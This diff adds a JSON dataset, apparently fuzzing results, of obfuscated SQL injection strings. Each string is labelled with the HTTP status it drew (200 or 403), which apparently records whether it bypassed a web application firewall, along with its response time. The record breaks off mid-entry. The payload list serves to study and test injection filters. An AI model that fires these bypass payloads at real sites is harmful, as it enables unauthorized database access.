@@ -1,0 +1,1626 @@
+[
+  {
+    "text": "0%27||+1<@.+or%0b~%0b{x%0b(select+1)}=1-(not%0b{a+1}=1)%0bor%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.0343167781829834,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "8'+or+!+{`if`%0b1}=1=%0b(!+{`if`+1}=1)%0b||'0",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03584480285644531,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||%0b1<@.%0b||%0b{`if`%0b1}=1=%0b(%7e%0b{a+1}=1)+or'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03844141960144043,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27+or%0bnot%0b{x+(select%0b1)}=1<(~+0)%0b||%270",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.028902530670166016,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+@<@.+or+not%0b{x%0b(select+1)}=1%3C({x%0b(select+1)}=1)%0b||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03711533546447754,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "9'+or%0b%7e%0b1>(!%0btrue)+or'0",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.033006906509399414,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+@<@+or%0bnot%7e0<(~+{x+(select%0b1)}=1)+or%27",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.034750938415527344,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "7%0bor+!%0b{x%0b(select%0b1)}=1=%0b(!+{x+(select%0b1)}=1)%23",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03772616386413574,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||+@<@.%0bor+!+{a%0b1}=1=+(not%7efalse)%0b||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.04014873504638672,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||%0b1<@+or%0bnot%0b{x%0b(select%0b1)}=1+is%0bfalse%0b||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03745603561401367,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "8'+||%0b%7e%0b{x+(select+1)}=1=%0b({a%0b1}=1)+||'0",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.031839609146118164,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+1<@.+||+!%0b{x%0b(select+1)}=1%3C(~+{`if`+1}=1)%0b||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.04000496864318848,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||%0b!@<@%0bor+!%0b0=%0b(%7e+true)+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03563404083251953,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or%0b@<@%0b||+1=%0b(~%0b1)+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.037863969802856445,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or%0b@<@+or%0b!+0>(not+{x+(select+1)}=1)%0bor'",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.0314633846282959,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||%0b1<@.+||%0b!%0b1=%0b(not+{a%0b1}=1)%0bor%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03461766242980957,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||+1<@.%0bor+%7e%0b{x+(select%0b1)}=1=+(1)%0b||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03588700294494629,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or+!@<@.%0b||+!%0btrue=%0b(!%0btrue)+or'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.0347445011138916,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+1<@.+or+!+{a+1}=1=%0b(not%0b{a+1}=1)+or%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03481459617614746,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+@<@%0b||%0btrue-(not%0b{`if`%0b1}=1)%0bor%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03315472602844238,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||+1<@+or%0b%7e+0=+(%7e+0)%0b||%27",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03129220008850098,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "6'%0b||+!+{x+(select%0b1)}=1=+(not%0b{a%0b1}=1)%0bor'0",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.02613091468811035,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "3%27%0bor%0b!%7efalse%3C(~%0b{x+(select%0b1)}=1)+||%270",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03096318244934082,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'<@!=1.+||%0b!+{x%0b(select%0b1)}=1%3C(%7e+{`if`%0b1}=1)%0bor'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.04054975509643555,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||+1<@.+||%0b%7e+0=%0b(%7e%0b{x%0b(select%0b1)}=1)+||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03918027877807617,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "2+or%0b%7e%0b{`if`+1}=1-(!%0b{`if`%0b1}=1)+",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03436756134033203,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or%0b1<@+||+not+true=+(!%0b{x%0b(select+1)}=1)+||%27",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.030704021453857422,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+@<@.%0bor+!+{a%0b1}=1=%0b(!+{x+(select%0b1)}=1)+||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.032337188720703125,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||%0b@<@%0b||%0b~%0b{x+(select%0b1)}=1=+(%7e%0b1)%0b||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.038373708724975586,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+@<@.+or%0b!+0=%0b(not+false)+or'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.0399928092956543,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+@<@+||%0b!%0b1=%0b(!+1)%0bor'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.04041886329650879,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "4%27%0b||%0b!+{x+(select+1)}=1%3C(not+false)+or%270",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.025346755981445312,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or%0b1<@%0bor+~%0b1=+(~%0b{x+(select+1)}=1)%0bor'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.037735700607299805,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or%0b1<@%0bor+!+{a%0b1}=1<(~%0b{x+(select%0b1)}=1)%0bor'",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03197526931762695,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||%0b@<@.%0bor+{a%0b1}=1-(!%0b{x%0b(select+1)}=1)%0b||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.0376133918762207,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||%0b@<@%0bor+%7e+0=%0b(~+1)%0bor'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03304290771484375,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or+!@<@%0b||%0b!+1=%0b(!%0b{`if`+1}=1)+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03600192070007324,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "5+||+!+{x%0b(select+1)}=1%3C(~+{a%0b1}=1)--+",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.028033018112182617,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "6%27%0bor%0bnot%0b{`if`+1}=1<(~%0b{x+(select+1)}=1)%0bor%270",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.0401606559753418,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+@<@.%0bor+!%0b{`if`+1}=1%3C(%7e%0b{`if`%0b1}=1)%0b||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03776288032531738,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "5+or+%7e+{x+(select+1)}=1=+(~%0b{x%0b(select+1)}=1)%0b",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03646540641784668,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "3%0b||+not~0%3C(%7e+{x%0b(select%0b1)}=1)--%0b",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03481554985046387,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||%0b@<@+||+!%0b{x+(select%0b1)}=1=%0b(not+1)+||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.037886857986450195,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "6+||+!%7e0%3C(%7e%0b{x%0b(select%0b1)}=1)%23",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03339433670043945,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||%0b@<@+or+not+false=+({x%0b(select%0b1)}=1)%0bor%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.040529489517211914,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+1<@.%0bor+~%0btrue>(false)+or'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03971385955810547,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or+!@<@+or+~%0bfalse>(not%0b{`if`+1}=1)+or'",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03451895713806152,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+!@<@%0b||+!%7e0<(%7e%0b{`if`%0b1}=1)+||%27",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03334689140319824,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or%0b1<@%0bor+%7e%0b1-(!~false)+||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03638339042663574,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or%0b@<@.+or+~%0b{x+(select+1)}=1=+(~%0btrue)+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03361940383911133,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or+1<@.+||%0b%7e+{x+(select+1)}=1>(!%0btrue)%0b||'",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03206276893615723,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||%0b!@<@%0b||+{x+(select%0b1)}=1=+(%7e%0b{x%0b(select+1)}=1)%0b||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.040218353271484375,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27+or%0b~+{x%0b(select+1)}=1=+(~%0b{a%0b1}=1)+||%270",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03253746032714844,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "1%27%0bor%0b!+0-(not+{`if`+1}=1)%0b||%270",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03396940231323242,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "2%27+||%0b~%0b{`if`%0b1}=1=%0b(~+{x%0b(select%0b1)}=1)%0bor%270",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03896665573120117,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+!@<@.%0b||%0bnot%0b{a+1}=1<(%7e%0bfalse)%0bor%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.037425994873046875,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27<@!=1.+||+!+true=+(not~false)+or%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03864336013793945,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "5%0bor+!%0b{`if`%0b1}=1=+(not%0b{x%0b(select+1)}=1)%23",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03853273391723633,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'<@=1%0b||%0b!%0b{x+(select+1)}=1=%0b(not+{`if`+1}=1)%0bor'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03662443161010742,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+!@<@.%0bor+{`if`+1}=1=+(%7e+{x%0b(select%0b1)}=1)+or'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.037312984466552734,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "7'+||+not+0>(!%0b{x+(select%0b1)}=1)+or'0",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.029920101165771484,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'<@!=.1%0b||+{x+(select%0b1)}=1+like%0b{x%0b(select%0b1)}=1+or'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03618049621582031,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+1<@+or+{`if`%0b1}=1+like+1+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.040662288665771484,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "9%0bor+~+{`if`%0b1}=1=%0b(~+{a+1}=1)%23",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03449606895446777,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "1%27+||+~+1=%0b(~%0b{`if`%0b1}=1)%0bor%270",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.0399937629699707,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "5%0b||%0b~%0b{x%0b(select+1)}=1=%0b(~%0btrue)%23",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03376340866088867,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||+@<@.%0bor+%7e%0b{a%0b1}=1=+(~+{x+(select+1)}=1)+||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03661608695983887,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||+@<@+or+{a+1}=1>(not%0b{a%0b1}=1)+or%27",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03145313262939453,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "8+||+not~0%3C(%7e%0b{x%0b(select+1)}=1)+",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.027906417846679688,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or%0b1<@.+||%0bnot%0b{a+1}=1=%0b(!+true)%0bor'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.036164045333862305,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||+1<@%0bor+~%0b{x+(select+1)}=1>(not+1)%0b||%27",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.031152725219726562,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||+1<@.%0bor+{x%0b(select+1)}=1=+(%7e%0b{`if`+1}=1)%0bor%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03550887107849121,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+1<@+or%0b!%0b{a%0b1}=1=%0b(false)%0b||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.040428876876831055,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+!@<@.+||%0b%7e+0=%0b(~%0b1)%0b||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.04206585884094238,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or+@<@.%0bor+!+{x%0b(select+1)}=1<(%7e+false)+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03388404846191406,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||+1<@.%0bor+not+{`if`+1}=1<(%7e+0)%0bor%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03598952293395996,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or+!@<@.%0bor+~%0btrue=%0b(%7e%0b{`if`%0b1}=1)%0b||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03513216972351074,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+1<@.%0b||%0b~%0b0=%0b(%7e%0b{x+(select%0b1)}=1)+or%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03690671920776367,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27+||%0b%7e+0-(not+{x+(select%0b1)}=1)+||%270",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03169727325439453,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+1<@.%0bor+!+{x%0b(select+1)}=1=+(not%7e0)%0bor'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03706216812133789,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27<@!=1.%0bor+!+1=+(not%0b1)+||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.039498329162597656,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "9+||%0bnot%0b{a+1}=1<(%7e%0b{x%0b(select+1)}=1)--%0b",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.030837059020996094,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||%0b!@<@.%0bor%0btrue>(not%0btrue)+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.07354044914245605,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||%0b1<@.+or+%7e+{a%0b1}=1=+(%7e+false)%0bor'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03506135940551758,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27<@=.1+or+!%0bfalse>(!+{x+(select+1)}=1)%0b||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.04080772399902344,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27<@!=1.+or%0bnot%7efalse%3C(~%0bfalse)%0b||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.038753509521484375,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+!@<@.%0b||+not%0b{`if`%0b1}=1=+(not%0b{`if`+1}=1)%0bor'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03443288803100586,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+1<@%0b||%0b~%0b{a+1}=1=%0b(%7e+{x%0b(select+1)}=1)%0bor'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.16783785820007324,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+!@<@+||+!%0b{`if`+1}=1%3C(~+true)+||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03795742988586426,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "6%27%0b||+not+{x%0b(select+1)}=1%3C(%7e+{x%0b(select+1)}=1)%0b||%270",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.030625343322753906,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+@<@+or%0b%7e%0b1=+(~+false)+||'",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03480076789855957,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or%0b!@<@.+or+%7e+0-(not%0b{x+(select+1)}=1)+or%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03589010238647461,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or%0b!@<@%0bor%0b!%0b1<(~%0b{a%0b1}=1)+||%27",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.02799367904663086,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "9+or%0b!+{x+(select%0b1)}=1=+(not%0b{`if`%0b1}=1)%23",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03152132034301758,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or+!@<@%0b||+{a%0b1}=1=+(%7e%0b1)+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03580307960510254,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'<@=1.%0bor+not%0b{x+(select+1)}=1<(~%0b{x%0b(select+1)}=1)--%0b",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03629779815673828,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||+@<@%0b||%0b%7e+false=+(not+0)+or%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.04374074935913086,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "9%0bor+not%0b{x%0b(select+1)}=1%3C(true)%0b",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.027429819107055664,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27<@!=1+or%0b%7e%0b{x%0b(select%0b1)}=1=+({x%0b(select%0b1)}=1)%23",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.031224489212036133,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+@<@.+||+not%0b{a+1}=1=%0b(!%0b{`if`+1}=1)+or%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.036504268646240234,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+1<@.+or%0b~+{x+(select%0b1)}=1=%0b(~%0b{`if`+1}=1)+or'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03463578224182129,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27<@!=1.+||%0b!+{a+1}=1%3C(~%0b0)%0bor%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.037665367126464844,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+1<@+||+{x%0b(select+1)}=1-(!+true)+||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03966021537780762,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||%0b@<@%0bor%0b!~false=%0b(!+{`if`%0b1}=1)+||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03784346580505371,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'<@!=1%0b||%0b1=+(not%0b0)%0bor'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03588509559631348,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "6%27%0bor+not+0=%0b(not%0bfalse)+||%270",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.04016375541687012,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'<@!=.1%0bor%0b!%0b1=%0b(!+{x%0b(select+1)}=1)%0bor'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.039519548416137695,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||+@<@.%0bor+0%3C(not%0b0)%0b||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03566265106201172,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "5'%0b||%0b!%0b{x%0b(select%0b1)}=1=+(not+{a+1}=1)+||'0",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03650021553039551,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "9%0bor%0b!%0b{`if`%0b1}=1=+(not+1)%23",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.04184913635253906,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or%0b@<@+or%0b~%0b{x%0b(select%0b1)}=1>(!+{a+1}=1)%0bor'",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.02749013900756836,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'<@=1+or+not+0>(not+{x+(select%0b1)}=1)%0bor'",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.029953479766845703,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "1%27%0bor+{x%0b(select%0b1)}=1-(not%0b{a%0b1}=1)+||%270",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03708243370056152,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or%0b@<@.%0b||+not+1=%0b(!%0b{a+1}=1)%0b||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03608870506286621,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "1%27%0bor%0b~%0b{`if`+1}=1=%0b(%7e+{x%0b(select+1)}=1)%0b||%270",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03954720497131348,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'<@=.1%0b||%0b%7e%0b{x%0b(select%0b1)}=1-(!%0b{`if`+1}=1)%0bor'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03920698165893555,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or+@<@+or%0bnot%0b1<(%7e%0b{x%0b(select%0b1)}=1)%0b||'",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03381752967834473,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+@<@+or%0b{x+(select+1)}=1+like+{`if`%0b1}=1%0b||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03676033020019531,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||%0b1<@%0bor+!+false-(not+{x%0b(select+1)}=1)%0b||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03781890869140625,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27<@!=1%0b||+!~0%3C({x+(select+1)}=1)%23",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03789830207824707,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "2%0bor+!%0b1=+(!+{x+(select+1)}=1)--+",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03803658485412598,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or%0b@<@.+or%0b!%0b{x%0b(select%0b1)}=1=%0b(!%0b{x%0b(select+1)}=1)%0b||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.037876129150390625,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or%0b1<@%0bor%0b~+0-(not%0b{x+(select%0b1)}=1)%0b||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03601503372192383,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+@<@+or+1>(!%0b{`if`+1}=1)%0bor%27",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03441286087036133,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "8%0bor%0b!+{`if`%0b1}=1<(!%0b0)%23",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03695869445800781,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or%0b@<@%0b||+!+{x%0b(select%0b1)}=1%3C(~+{x%0b(select%0b1)}=1)+or'",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03235316276550293,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "8+or+~+{x+(select%0b1)}=1>(!%0b{a%0b1}=1)%0b",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.035063982009887695,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or+@<@+or+!~false=%0b(not%0btrue)%0bor'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03885769844055176,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or+@<@+or+~%0b{a%0b1}=1%0bis+true+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.036015987396240234,
+    "syntax_valid": true,
